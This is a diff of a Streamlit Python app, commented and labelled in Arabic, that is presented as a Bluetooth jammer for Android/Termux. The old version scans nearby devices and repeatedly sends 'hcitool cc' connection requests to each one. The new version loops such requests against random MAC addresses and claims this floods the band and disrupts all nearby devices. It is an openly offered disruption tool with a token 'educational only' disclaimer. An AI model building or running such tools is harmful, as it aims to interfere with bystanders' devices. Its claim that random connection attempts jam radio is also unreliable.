@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
-# أداة Jammer بلوتوث شامل - يعمل على أندرويد (Termux)
-# تشويش على جميع الأجهزة القريبة بدون اختيار
+# أداة Jammer بلوتوث - تشويش مستمر بدون مسح
+# يرسل إشارات تشويش فقط دون البحث عن أجهزة
 # التشغيل: streamlit run bluetooth_jammer.py
 
 import streamlit as st
 import subprocess
 import time
 import threading
-import re
+import random
 
 # إعداد الصفحة
 st.set_page_config(
@@ -16,8 +16,8 @@ st.set_page_config(
     layout="centered"
 )
 
-st.markdown("# 📡 Bluetooth Jammer شامل")
-st.markdown("### تشويش على جميع الأجهزة القريبة")
+st.markdown("# 📡 Bluetooth Jammer")
+st.markdown("### تشويش مستمر - بدون مسح الأجهزة")
 st.markdown("---")
 
 st.warning("⚠️ هذا للاستخدام التعليمي فقط. تحقق من القوانين المحلية.")
@@ -27,125 +27,62 @@ st.warning("⚠️ هذا للاستخدام التعليمي فقط. تحقق �
 # ============================================================
 if 'jamming' not in st.session_state:
     st.session_state.jamming = False
-if 'devices' not in st.session_state:
-    st.session_state.devices = []
 if 'log' not in st.session_state:
     st.session_state.log = []
-if 'attack_active' not in st.session_state:
-    st.session_state.attack_active = False
+if 'packets_sent' not in st.session_state:
+    st.session_state.packets_sent = 0
 
 # ============================================================
 # وظائف التشويش
 # ============================================================
 
-def scan_bluetooth():
-    """مسح الأجهزة القريبة"""
-    try:
-        result = subprocess.run(
-            ["hcitool", "scan"],
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
-        lines = result.stdout.splitlines()
-        devices = []
-        for line in lines[1:]:
-            if line.strip():
-                parts = line.split(maxsplit=1)
-                if len(parts) == 2:
-                    mac = parts[0]
-                    name = parts[1]
-                    devices.append({"mac": mac, "name": name})
-                elif len(parts) == 1:
-                    devices.append({"mac": parts[0], "name": "Unknown"})
-        return devices
-    except Exception as e:
-        return []
+def generate_random_mac():
+    """توليد عنوان MAC عشوائي"""
+    return ":".join(f"{random.randint(0, 255):02X}" for _ in range(6))
 
-def jam_device(mac):
-    """تشويش على جهاز واحد"""
+def send_jam_packet():
+    """إرسال حزمة تشويش عشوائية"""
     try:
+        # توليد MAC عشوائي
+        fake_mac = generate_random_mac()
+        
+        # محاولة الاتصال بـ MAC عشوائي (إغراق)
         subprocess.run(
-            ["hcitool", "cc", mac],
+            ["hcitool", "cc", fake_mac],
             capture_output=True,
-            timeout=1
+            timeout=0.5
         )
         return True
     except:
         return False
 
-def jam_all_devices(devices, intensity=3):
-    """تشويش على جميع الأجهزة"""
-    if not devices:
-        return 0
-    
-    count = 0
-    for device in devices:
-        mac = device["mac"]
+def continuous_jam(intensity=5, interval=0.1):
+    """تشويش مستمر بدون مسح"""
+    while st.session_state.jamming:
+        success_count = 0
+        
+        # إرسال حزم تشويش بعدد حسب الشدة
         for _ in range(intensity):
             if not st.session_state.jamming:
-                return count
-            jam_device(mac)
-            count += 1
-            time.sleep(0.1)
-    
-    return count
-
-def continuous_jam(devices, intensity=3, interval=2):
-    """تشويش مستمر على جميع الأجهزة"""
-    while st.session_state.jamming:
-        if devices:
-            count = jam_all_devices(devices, intensity)
-            log_msg = f"✅ تم تشويش على {count} جهاز"
+                break
+            if send_jam_packet():
+                success_count += 1
+                st.session_state.packets_sent += 1
+            time.sleep(0.05)
+        
+        # تسجيل النشاط
+        if success_count > 0:
+            log_msg = f"📡 تم إرسال {success_count} حزمة تشويش - إجمالي: {st.session_state.packets_sent}"
             st.session_state.log.append(log_msg)
             if len(st.session_state.log) > 50:
                 st.session_state.log = st.session_state.log[-50:]
-        else:
-            log_msg = "⚠️ لا توجد أجهزة للتشويش"
-            st.session_state.log.append(log_msg)
-        
-        # إعادة المسح لالتقاط أجهزة جديدة
-        new_devices = scan_bluetooth()
-        if new_devices:
-            st.session_state.devices = new_devices
         
         time.sleep(interval)
 
 # ============================================================
-# عرض الأجهزة المكتشفة
+# الواجهة الرئيسية
 # ============================================================
 
-st.markdown("### 📱 الأجهزة القريبة")
-
-# زر المسح
-if st.button("🔍 مسح الأجهزة", use_container_width=True):
-    with st.spinner("⏳ جاري المسح..."):
-        devices = scan_bluetooth()
-        if devices:
-            st.session_state.devices = devices
-            st.success(f"✅ تم العثور على {len(devices)} جهاز")
-        else:
-            st.warning("❌ لم يتم العثور على أجهزة. تأكد من تشغيل البلوتوث.")
-
-# عرض الأجهزة
-if st.session_state.devices:
-    device_data = []
-    for i, device in enumerate(st.session_state.devices):
-        device_data.append({
-            "رقم": i + 1,
-            "الاسم": device["name"],
-            "MAC": device["mac"]
-        })
-    st.dataframe(device_data, use_container_width=True)
-    st.caption(f"📊 إجمالي الأجهزة: {len(st.session_state.devices)}")
-else:
-    st.info("📌 اضغط على 'مسح الأجهزة' لكشف الأجهزة القريبة")
-
-# ============================================================
-# إعدادات التشويش
-# ============================================================
-
-st.markdown("---")
 st.markdown("### ⚙️ إعدادات التشويش")
 
 col1, col2 = st.columns(2)
@@ -153,17 +90,18 @@ with col1:
     intensity = st.slider(
         "شدة التشويش:",
         min_value=1,
-        max_value=10,
-        value=5,
-        help="عدد الطلبات المرسلة لكل جهاز"
+        max_value=20,
+        value=10,
+        help="عدد الحزم المرسلة في كل دورة"
     )
 with col2:
     interval = st.slider(
-        "فترة التحديث (ثواني):",
-        min_value=1,
-        max_value=10,
-        value=3,
-        help="المدة بين كل جولة تشويش"
+        "السرعة (ثواني):",
+        min_value=0.05,
+        max_value=1.0,
+        value=0.1,
+        step=0.05,
+        help="الوقت بين كل دورة تشويش"
     )
 
 # ============================================================
@@ -175,27 +113,23 @@ col1, col2 = st.columns(2)
 
 with col1:
     if not st.session_state.jamming:
-        if st.button("🚀 بدء التشويش الشامل", use_container_width=True):
-            if not st.session_state.devices:
-                st.error("❌ لا توجد أجهزة. قم بالمسح أولاً.")
-            else:
-                st.session_state.jamming = True
-                st.session_state.attack_active = True
-                st.success("🔥 بدأ التشويش على جميع الأجهزة القريبة")
-                
-                # تشغيل التشويش في خيط منفصل
-                thread = threading.Thread(
-                    target=continuous_jam,
-                    args=(st.session_state.devices, intensity, interval),
-                    daemon=True
-                )
-                thread.start()
+        if st.button("🚀 بدء التشويش", use_container_width=True):
+            st.session_state.jamming = True
+            st.session_state.packets_sent = 0
+            st.success("🔥 بدأ التشويش المستمر")
+            
+            # تشغيل التشويش في خيط منفصل
+            thread = threading.Thread(
+                target=continuous_jam,
+                args=(intensity, interval),
+                daemon=True
+            )
+            thread.start()
 
 with col2:
     if st.session_state.jamming:
         if st.button("🛑 إيقاف التشويش", use_container_width=True):
             st.session_state.jamming = False
-            st.session_state.attack_active = False
             st.warning("⏹️ تم إيقاف التشويش")
 
 # ============================================================
@@ -204,7 +138,16 @@ with col2:
 
 if st.session_state.jamming:
     st.info("🔄 التشويش قيد التنفيذ...")
-    st.progress(1.0, text="🔥 جاري تشويش الأجهزة القريبة")
+    st.progress(1.0, text="📡 جاري إرسال حزم التشويش")
+    
+    # إحصائيات حية
+    col1, col2 = st.columns(2)
+    with col1:
+        st.metric("📦 الحزم المرسلة", st.session_state.packets_sent)
+    with col2:
+        st.metric("📡 الحالة", "🟢 نشط")
+else:
+    st.info("⏸️ التشويش متوقف")
 
 # ============================================================
 # سجل التشويش
@@ -228,18 +171,31 @@ if st.button("🧹 مسح السجل", use_container_width=True):
 # إحصائيات
 # ============================================================
 
-if st.session_state.devices:
-    st.markdown("---")
-    st.markdown("### 📊 إحصائيات")
-    
-    col1, col2, col3 = st.columns(3)
-    with col1:
-        st.metric("📱 الأجهزة المكتشفة", len(st.session_state.devices))
-    with col2:
-        st.metric("⚡ شدة التشويش", intensity)
-    with col3:
-        status = "🟢 نشط" if st.session_state.jamming else "🔴 متوقف"
-        st.metric("📡 الحالة", status)
+st.markdown("---")
+st.markdown("### 📊 إحصائيات التشويش")
+
+col1, col2, col3 = st.columns(3)
+with col1:
+    st.metric("📦 إجمالي الحزم", st.session_state.packets_sent)
+with col2:
+    st.metric("⚡ شدة التشويش", intensity)
+with col3:
+    status = "🟢 نشط" if st.session_state.jamming else "🔴 متوقف"
+    st.metric("📡 الحالة", status)
+
+# ============================================================
+# معلومات عن التشويش
+# ============================================================
+
+st.markdown("---")
+st.markdown("### ℹ️ كيف يعمل التشويش؟")
+
+st.markdown("""
+1. **لا يبحث عن أجهزة** - يرسل إشارات عشوائية مباشرة
+2. **إغراق التردد** - يرسل طلبات اتصال لعناوين MAC عشوائية
+3. **تشويش شامل** - يؤثر على جميع الأجهزة في النطاق
+4. **مستمر** - يعمل بشكل متواصل حتى يتم إيقافه
+""")
 
 # ============================================================
 # التذييل
@@ -247,9 +203,9 @@ if st.session_state.devices:
 
 st.markdown("---")
 st.markdown("⚠️ **ملاحظات مهمة:**")
-st.markdown("1. هذه الأداة تشوش على **جميع** الأجهزة القريبة")
-st.markdown("2. تأكد من تشغيل البلوتوث على هاتفك")
-st.markdown("3. قد لا تعمل على بعض الأجهزة بسبب إعدادات الأمان")
+st.markdown("1. هذه الأداة ترسل إشارات تشويش مستمرة")
+st.markdown("2. لا تبحث عن أجهزة، فقط ترسل حزم عشوائية")
+st.markdown("3. قد تؤثر على جميع أجهزة البلوتوث القريبة")
 st.markdown("4. للاستخدام التعليمي فقط")
 
 st.markdown("made by @cheifbreef on discord :)")
